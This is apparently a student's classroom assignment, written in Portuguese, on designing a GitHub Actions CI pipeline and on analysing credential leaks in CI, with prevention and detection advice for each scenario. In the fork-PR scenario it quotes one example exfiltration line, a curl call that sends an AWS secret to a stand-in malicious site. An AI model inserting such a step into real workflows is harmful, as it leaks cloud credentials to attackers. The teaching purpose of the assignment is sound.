# Trabalho em Aula — Aula 08: GitHub Actions e CI Pipelines

**Aluno:** Emilly Santos de Oliveira
**RA:** 4023575
**Data:** 12/10/2026

Parte 1 — Design de Pipeline CI

  Estágios do pipeline:

  ┌────────────────┬──────────────────────────────────────────────────────┬──────────────┬────────────────┐
  │ Estágio        │ O que verifica                                       │ Obrigatório? │ Tempo estimado │
  ├────────────────┼──────────────────────────────────────────────────────┼──────────────┼────────────────┤
  │ Lint (ESLint)  │ Estilo e qualidade do código                         │      ✅      │      ~30s      │
  ├────────────────┼──────────────────────────────────────────────────────┼──────────────┼────────────────┤
  │ Test (Jest)    │ Funcionamento dos endpoints e cobertura de código    │      ✅      │     ~1min      │
  ├────────────────┼──────────────────────────────────────────────────────┼──────────────┼────────────────┤
  │ Build (Docker) │ Se a imagem constrói e o container sobe corretamente │      ✅      │     ~1min      │
  └────────────────┴──────────────────────────────────────────────────────┴──────────────┴────────────────┘

  Respostas:

  - O pipeline deve rodar em: todo push para main e em todo pull_request aberto contra main
  - Um PR deve ser bloqueado quando: qualquer um dos jobs falha — se o lint detectar erro de estilo, os testes não rodam; se os testes falharem, o Docker
  não é buildado
  - Como o time fica sabendo que quebrou: pelo badge no README (fica vermelho), pelo e-mail de notificação automático do GitHub Actions, e pelo comentário
  automático no PR

  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

  Parte 2 — Análise de Segurança de Credenciais

  Cenário 1 — O .env esquecido

  - O que aconteceu: um desenvolvedor commitou o arquivo .env com senhas e chaves de API diretamente no repositório
  - Impacto: qualquer pessoa com acesso ao repo (ou ao histórico do Git) consegue ver as credenciais — mesmo depois de deletar o arquivo, ele continua no
  histórico
  - Como prevenir: adicionar .env no .gitignore antes do primeiro commit; usar .env.example com valores fictícios como modelo
  - Como detectar: ferramentas como git-secrets, truffleHog ou o próprio GitHub Secret Scanning que avisa quando detecta padrões de credenciais em commits

  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

  Cenário 2 — O workflow indiscreto

  - O que aconteceu: o workflow imprime o valor de um secret com echo ${{ secrets.AWS_SECRET_KEY }} diretamente no log
  - Impacto: o GitHub mascara secrets conhecidos como ***, mas se o valor for transformado (ex: base64, split em partes) o mascaramento não funciona e o
  valor real aparece nos logs públicos
  - Como prevenir: nunca imprimir secrets diretamente; usar apenas para passar como variável de ambiente para comandos; no nosso workflow usamos echo
  "Região: ${{ secrets.AWS_REGION }}" apenas para confirmar que está definido, não para revelar o valor
  - Como detectar: revisar os logs de execução do Actions; auditar o workflow antes de mergar PRs de terceiros

  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

  Cenário 3 — O PR do fork

  - O que aconteceu: alguém faz um fork público do repositório, abre um PR e modifica o workflow para exfiltrar os secrets (curl
  https://site-malicioso.com?key=${{ secrets.AWS_SECRET_KEY }})
  - Impacto: em repositórios públicos, PRs de forks não têm acesso aos secrets por padrão — mas se o maintainer aprovar o workflow manualmente, os secrets
  ficam expostos
  - Como prevenir: o GitHub bloqueia secrets em PRs de forks por padrão; nunca usar pull_request_target sem revisão cuidadosa; exigir aprovação antes de
  rodar workflows de forks desconhecidos
  - Como detectar: revisar sempre o diff do arquivo .github/workflows/ em PRs externos antes de aprovar; configurar branch protection rules exigindo revisão
  de código